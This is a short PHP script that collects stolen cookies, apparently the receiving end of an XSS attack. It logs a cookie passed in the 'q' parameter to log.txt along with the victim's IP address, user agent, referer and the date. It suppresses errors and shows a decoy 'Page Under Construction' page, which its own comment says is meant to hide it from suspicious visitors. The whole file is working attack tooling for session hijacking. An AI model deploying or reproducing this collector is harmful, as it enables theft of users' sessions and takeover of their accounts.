<?php
error_reporting(0); # Turn off all error reporting
if(isset($_GET['q'])){
        //$cookie=$_GET['q'];

        $referer = $_SERVER['HTTP_REFERER'];
        $client_ip = $_SERVER['REMOTE_ADDR'];
        $User_Agent = $_SERVER['HTTP_USER_AGENT'];
        $date = date('d-m-Y \à H\hi');
        $data = "------------------------------\r\n\nDate : $date\r\nClient ip : $client_ip\r\nUser_Agent:$User_Agent\r\nReferer : $referer\r\nCookie : ".htmlentities($_GET['q'])."\r\n\n------------------------------\r\n";

        $fn="log.txt";   # The log file
        $fh=fopen($fn,'a');   # Open log file in append mode
        fwrite($fh,$data."\n"); # Append the cookie
        fclose($fh);  # close the file
}
echo '<h1>Page Under Construction</h1>'; # Trying to hide suspects…

//header ('Location:https://google.com');
?>
